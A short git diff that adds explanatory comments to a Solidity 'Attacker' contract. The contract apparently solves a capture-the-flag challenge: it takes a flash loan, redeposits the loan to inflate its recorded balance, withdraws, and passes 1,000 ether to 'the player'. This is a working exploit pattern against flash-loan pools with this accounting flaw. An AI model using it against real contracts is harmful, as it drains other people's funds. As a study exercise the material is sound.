@@ -18,9 +18,15 @@ contract Attacker {
   }
 
   function attack() external {
+    // we borrow the funds, the flashLoan() function will
+    // call execute() and we deposit() these funds in there,
+    // incrementing our balance in the pool.
     pool.flashLoan(1_000 ether);
+    // as withdraw() only checks the balances[] mapping,
+    // we will get the amount recorded there.
     pool.withdraw();
 
+    // pass the funds to the player
     (bool success,) = msg.sender.call{value: 1_000 ether}("");
     success;
   }
